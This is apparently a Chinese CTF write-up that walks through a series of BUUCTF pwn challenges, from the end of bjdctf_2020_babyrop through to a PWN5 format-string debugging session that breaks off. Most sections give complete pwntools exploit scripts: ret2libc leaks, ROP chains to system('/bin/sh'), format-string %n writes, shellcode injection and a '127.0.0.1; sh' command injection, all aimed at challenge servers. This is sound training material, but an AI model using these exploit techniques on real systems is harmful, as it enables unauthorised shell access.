双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x20`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```python
ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/5.png)

编写`Python`代码即可得到`flag{aed7af27-c195-4e84-824f-263dc8fb04df}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28823)
e = ELF('bjdctf_2020_babyrop')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/6.png)

------

------

### [铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)

先`file ./2018_rop`查看文件类型再`checksec --file=2018_rop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/1.png)

用`IDA Pro 32bit`打开附件`2018_rop`，按`F5`反汇编源码并查看主函数，双击`be_nice_to_people()`函数查看详情并没有发现什么，

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/2.png)

双击`vulnerable_function()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x88`，`read()`函数限制了输入到`buf`变量的字节数为`0x100`，显然存在栈溢出漏洞。构造`payload`时先用`0x88`个字节占满`buf`变量，再加上`4`个字节覆盖到返回地址。

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并通过`write()`函数泄露`write()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`write()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

其中`write()`函数原型如下：

```c
ssize_t write(int fd, const void*buf, size_t count);
// write()会把参数buf所指的内存写入count个字节到参数fd所指的文件内。
// fd:是文件描述符（write所对应的是写，即就是1）
// buf:通常是一个字符串，需要写入的字符串
// count：是每次写入的字节数
```

编写`Python`代码即可得到`flag{f3efd9be-b4a5-4fd3-9446-49c300eaf93c}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29081)
e = ELF('./2018_rop')
write_plt = e.plt['write']
log.success('write_plt => %s' % hex(write_plt))
write_got = e.got['write']
log.success('write_got => %s' % hex(write_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0x88 + b'fuck' + p32(write_plt) + p32(main_address) # 栈溢出，返回地址填写write()函数在plt表中的地址，并加上main()函数地址以再次执行程序
payload += p32(0) + p32(write_got) + p32(4) # write()函数的参数
io.sendline(payload)
write_address = u32(io.recv(4))
log.success('write_address => %s' % hex(write_address))
libc = LibcSearcher('write', write_address) # 获取libc版本, libc6-i386_2.27-3ubuntu1_amd64
libcbase = write_address - libc.dump('write')
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_rop/4.png)

------

### [[OGeek2019]babyrop](https://buuoj.cn/challenges#[OGeek2019]babyrop)

先`file ./babyrop`查看文件类型再`checksec --file=./babyrop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/1.png)

用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/2.png)

双击`sub_80486BB()`函数查看详情发现这是一个初始化缓存区的函数。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/3.png)

双击`sub_804871F()`函数查看详情，发现传入的参数`a1`被格式化字符串后赋值给了变量`s`。`v1`变量用于获取`char`型数组`buf`的大小，`strncmp()`函数用于比较用户输入的数和随机数的大小，构造`payload`时可以先用`\x00`来绕过`strncmp()`，因为`strlen()`遇到`\x00`时便会停止获取长度。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/4.png)

双击`sub_80487D0()`函数查看详情，发现该函数声明了一个`char`型数组的局部变量`buf`，可用栈大小为`0xe7`。如果`a1`等于`127`则会读入`0xc8`个字节到变量`buf`并不会导致栈溢出，但是当`a1`大于`0xe7`时就会读入`a1`个字节到变量`buf`从而造成栈溢出漏洞。因为`a1`是函数`sub_804871F()`的返回值，所以构造`payload`时让`a1`的值大于`\xe7`就可以导致栈溢出啦。

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/5.png)

总的来说这题的思路就是：构造`payload`时先用`\x00`使得`v1`通过`strlen()`获取的返回值为0，从而绕过`strncmp()`的比较，此外`sub_804871F()`函数的返回值要尽可能大，所以`v5`读取输入时可以赋值为`\x00\xff\xff\xff\xff\xff\xff\xff`，这样函数返回值在传入`sub_80487D0()`函数时才能构造栈溢出漏洞。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是需要注意到主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的内存地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，利用栈溢出漏洞并通过`read()`函数泄露`write()`函数在`got`表中的内存地址`write_address`。接着我们需要用到题目给出的`libc-2.23.so`，根据`libc`中`write()`函数的偏移地址可以计算出该`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址可以计算出这俩个函数的内存地址，最后利用栈溢出漏洞来完成系统调用`system('/bin/sh')`，输入`cat flag`后即可拿到`flag`。

编写`Python`代码即可得到`flag{2c99881a-89e7-41c6-83a1-7a0e3781f961}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25522)
# io = process('./babyrop')
e = ELF('./babyrop')
io.sendline(b'\x00'.ljust(8, b'\xff'))
write_plt = e.plt['write']
write_got = e.got['write']
main_address = 0x8048825
payload = b'a'*0xe7 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Correct\n', payload)
write_address = u32(io.recv(4))
log.success('write_address => 0x%x', write_address)
libc = ELF('./libc-2.23.so')
libcbase = write_address - libc.symbols['write']
info('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system']
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => 0x%x', bin_sh_address)
io.sendline(b'\x00'.ljust(8, b'\xff'))
payload = b'a'*0xe7 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendlineafter(b'Correct\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/6.png)

------

### [jarvisoj_fm](https://buuoj.cn/challenges#jarvisoj_fm)

先`file ./jarvisoj_fm`查看文件类型再`checksec --file=./jarvisoj_fm`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/1.png)

用`IDA Pro 32bit`打开附件`jarvisoj_fm`，按`F5`反汇编源码并查看主函数，可以看到声明了一个可用栈大小为`0x5C`字节的`char`型变量`buf`，`read()`函数从`stdin`中读取了`0x50`字节数据到变量`buf`中。接着出现了一个明显的格式化字符串漏洞，

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/2.png)

双击变量`x`查看其在内存中的地址信息为`0x804A02C`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/3.png)

第10行的`printf()`其地址信息为`0x80485AD`，我们可以在这里设置一个断点。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/4.png)

`run`运行程序，输入多个`a`字符。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/5.png)

`x/16wx $esp`的意思是以`16`进制查看`$esp`寄存器的参数信息，`a`的`ACSII`码的`16`进制是`0x61`，我们可以看到赋值参数在第`11`位。接着我们利用`x`的地址配合上`%11$n`将`x`的值修改为`4`，即可让程序系统调用`/bin/sh`终端从而拿到`flag`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/6.png)

编写`Python`代码即可得到`flag{0516c5fb-3bf9-4ea8-a3ae-db6489a1db76}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29158)
x_addr = 0x804A02C
payload = p32(x_addr) + b'%11$n'
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/7.png)

------

### [jarvisoj_level1](https://buuoj.cn/challenges#jarvisoj_level1)

先`file ./level1`查看文件类型再`checksec --file=./level1`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level1
./level1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level1
[*] '/home/tyd/ctf/pwn/buuctf/level1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

用`IDA Pro 32bit`打开附件`level1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。此外，`printf`函数会直接将变量`buf`的地址泄露出来。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  printf("What's this:%p?\n", buf);
  return read(0, buf, 0x100u);
}
```

我们先截取`printf`函数打印出来的`buf`变量地址，在`buf`地址写入`shellcode`后，利用栈溢出漏洞覆盖`vulnerable_function()`函数返回地址，劫持程序去执行写入的`shellcode`。结果我吐了，本地能打通，靶机打不通。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = process('./level1')
# io = remote('node4.buuoj.cn', 25155)
io.recvuntil(b"What's this:")
buf_addr = int(io.recv()[2:-2], 16)
log.info('buf_addr: %#x', buf_addr)
shellcode = asm(shellcraft.sh())
payload = shellcode + b'a' * (0x88+0x4-len(shellcode)) + p32(buf_addr)
io.sendline(payload)
io.interactive()
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后通过`system`函数调用即可得到靶机的`shell`。编写`Python`代码求解可得`flag{24430808-9b8d-4a29-bd1e-e3b9df054dfb}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25155)
elf = ELF('./level1')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_plt = elf.plt['read']
bss_addr = elf.bss()

def leak(address):
    payload = b'a'*(0x88+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = b'a'*(0x88+0x4) + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### [jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)

先`file ./level2`查看文件类型再`checksec --file=./level2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level2    
./level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level2    
[*] '/home/tyd/ctf/pwn/buuctf/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数。

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system("echo 'Hello World!'");
  return 0;
}
```

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x88`个字节占满`buf`变量，再用`0x4`个字节覆盖到栈帧`r`。

```assembly
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 ;
-00000088
-00000088 buf             db 136 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

在`Functions window`中可以看到有个`system()`函数，其地址可以由`elf.symbols['system']`获得。使用`ROPgadget`可得`/bin/sh`的地址为`0x804a024`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./level2 --string "/bin/sh"    
Strings information
============================================================
0x : /bin/sh
```

编写`Python`代码求解，得到`flag{f0506726-1ac9-446a-8852-717784d3975d}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28530)
elf = ELF('./level2')
system_addr = elf.symbols['system']
bin_sh_addr = 0x804a024 # ROPgadget --binary ./level2 --string "/bin/sh"
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)

先`file ./level2_x64`查看文件类型再`checksec --file=./level2_x64`检查一下文件保护情况。

 ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/1.png)

用`IDA Pro 64bit`打开附件`level2_x64`，可以看到主函数的汇编语言代码如下，先是调用了一个名为`vulnerable_function()`的函数，然后系统调用`echo`语句输出了`Hello World!`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/2.png)

按`F5`进行反汇编后，可以看到`main()`函数的`C`语言代码如下：

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/3.png)

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x80`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x200`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/4.png)

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/5.png)

在`Functions window`中可以看到有个`system()`函数，其地址为`0x4004C0`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/6.png)

使用`ROPgadget`可以查看到`/bin/sh`的地址为`0x600A90`。

```bash
ROPgadget --binary ./level2_x64 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/7.png)

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/8.png)

编写 `Python`代码即可得到`flag{32d6e6d5-6d67-4486-b72b-5351bcfc4cc8}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27561)
e = ELF('./level2_x64')
system_address = e.symbols['system'] # 0x4004C0
bin_sh_address = 0x600A90 # ROPgadget --binary ./level2_x64 --string "/bin/sh"
pop_rdi = 0x4006B3 # ROPgadget --binary ./level2_x64 --only "pop|ret"
payload = b'a'*0x80 + b'fuckpwn!'
payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/9.png)

------

### [bjdctf_2020_router](https://buuoj.cn/challenges#bjdctf_2020_router)

先`file ./bjdctf_2020_router  `查看文件类型，再`checksec --file=./bjdctf_2020_router  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bjdctf_2020_router       
./bjdctf_2020_router: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41f17252e18bfaccd3440389de0dd5697148c91f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bjdctf_2020_router       
[*] '/home/tyd/ctf/pwn/pwnthebox/bjdctf_2020_router'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`./bjdctf_2020_router`后按`F5`反汇编源码并查看主函数。输入`1`是`ping`，并且`1`是直接`system()`系统调用输出的字符串，我们可以在此拼接上`sh`获得靶机`shell`权限。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  char buf[16]; // [rsp+10h] [rbp-70h] BYREF
  char dest[8]; // [rsp+20h] [rbp-60h] BYREF
  __int64 v7; // [rsp+28h] [rbp-58h]
  int v8; // [rsp+30h] [rbp-50h]
  char v9; // [rsp+34h] [rbp-4Ch]
  char v10[56]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  *(_QWORD *)dest = 0x20676E6970LL;
  v7 = 0LL;
  v8 = 0;
  v9 = 0;
  v4 = 0;
  puts("Welcome to BJDCTF router test program! ");
  while ( 1 )
  {
    menu();
    puts("Please input u choose:");
    v4 = 0;
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        puts("Please input the ip address:");
        read(0, buf, 0x10uLL);
        strcat(dest, buf);
        system(dest);
        puts("done!");
        break;
      case 2:
        puts("bibibibbibibib~~~");
        sleep(3u);
        puts("ziziizzizi~~~");
        sleep(3u);
        puts("something wrong!");
        puts("Test done!");
        break;
      case 3:
        puts("Please input what u want to say");
        puts("Your suggest will help us to do better!");
        read(0, v10, 0x3AuLL);
        printf("Dear ctfer,your suggest is :%s", v10);
        break;
      case 4:
        puts("Hey guys,u think too much!");
        break;
      case 5:
        puts("Good Bye!");
        exit(-1);
      default:
        puts("Functional development!");
        break;
    }
  }
}
```

编写`Python`代码解得`flag{d8dc77b9-ebba-4da1-b459-2f23fd1fc1bc}`，提交即可。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29833)
io.sendlineafter('Please input u choose:', b'1')
io.sendlineafter('Please input the ip address:', b'127.0.0.1; sh')
io.interactive()
```

------

### ♥ [[第五空间2019 决赛]PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)

先`file ./pwn  `查看文件类型，再`checksec --file=./pwn  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./pwn           
./pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`pwn`后按`F5`反汇编源码并查看主函数。程序首先生成一个随机值并读取到在`.bss`段存储的`dword_804C044`变量中，然后将用户输入读取到`buf`变量中并进行输出，`buf`变量长度为`0x70`字节，`read`函数读取时限制的输入为`0x63`字节，并不存在栈溢出漏洞，但是`printf`函数存在格式化字符串漏洞。接着将用户的下个输入读取到`nptr`变量中，如果`nptr`变量转换成整型后的数值，和`.bss:0804C044`字段中`dword_804C044`变量保存的随机值相等，即可获取到靶机的`shell`权限。

```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

使用`gdb ./pwn`对程序进行调试，这里我用的是`pwndbg`，在`printf`处设置断点`b printf`，`run`运行程序后使用`stack 20`查看栈，可以得知格式化字符串的偏移量是`10`。

```bash
pwndbg> b printf
Breakpoint 1 at 0x8049040
pwndbg> run
Starting program: /home/tyd/ctf/pwn/buuctf/pwn 

Breakpoint 1, __printf (format=0x804a015 "your name:") at printf.c:32
32      printf.c: 没有那个文件或目录.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x804a015 ◂— 'your name:'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
 ECX  0x804c044 ◂— 0xf2df338f
 EDX  0x4
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x804928d ◂— add    esp, 0x10
        arg[1]: 0x804a015 ◂— 'your name:'
        arg[2]: 0x804c044 ◂— 0xf2df338f
        arg[3]: 0x4
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a015 ◂— 'your name:'
02:0008│     0xffffd074 —▸ 0x804c044 ◂— 0xf2df338f
03:000c│     0xffffd078 ◂— 0x4
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x804928d
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
your name:AAAA   

Breakpoint 1, __printf (format=0x804a020 "Hello,") at printf.c:32
32      in printf.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
*EAX  0x804a020 ◂— 'Hello,'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
*ECX  0xffffd098 ◂— 'AAAA\n'
*EDX  0x63
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x80492b2 ◂— add    esp, 0x10
        arg[1]: 0x804a020 ◂— 'Hello,'
        arg[2]: 0xffffd098 ◂— 'AAAA\n'
        arg[3]: 0x63
 
